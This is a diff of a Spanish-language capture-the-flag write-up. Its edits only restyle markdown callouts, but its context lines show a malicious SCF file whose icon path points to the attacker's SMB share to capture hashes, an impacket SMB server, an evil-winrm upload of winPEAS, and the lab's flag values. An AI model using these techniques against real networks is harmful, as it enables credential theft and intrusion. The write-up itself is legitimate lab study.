@@ -114,7 +114,7 @@ IconFile=\\<MI-IP>\share\test.ico
 Command=ToggleDesktop
 ```
 
->[!NOTE] Nota
+>[!note] Nota
 El símbolo `@` al inicio del nombre de archivo (`@gethash.scf`) es una técnica que a veces se usa en Windows para que el archivo aparezca en la parte superior de la lista en una carpeta compartida, facilitando que el usuario lo vea y, por ende, interactúe con él.
 
 Posteriormente, configuré un servidor SMB en mi máquina atacante (`<MI-IP>`) utilizando `impacket-smbserver` para interceptar la conexión:
@@ -187,7 +187,7 @@ Para identificar posibles vectores de escalada, utilicé `winPEAS`, una herramie
     ```PowerShell
     *Evil-WinRM* PS C:\Windows\Temp\share> upload <ubicacion en mi maquina>
     ```
->[!TIP]
+>[!tip]
 > evil-winrm me permite subir y descargar archivos con facilidad, simplemente poniendo `upload` o `download` y la tecla tab luego de las primeras letras del archivo.
 
 4. **Habilitar Colores en la Consola (Opcional):** Para una mejor visualización de la salida de `winPEAS` con colores, ajusté la clave de registro `VirtualTerminalLevel`:
@@ -265,12 +265,12 @@ ___
 
 ## Bandera(s)
 
-> [!FLAG] `flag{user}`
+> [!flag] `flag{user}`
 > 5a4469b085a21610e27b8d65f1358449
-^bandera
+^bandera-user
 
-> [!FLAG] `flag{root}`
+> [!flag] `flag{root}`
 >dc413510b078b501b04e7d672d0739cd
-^bandera
+^bandera-root
 
 
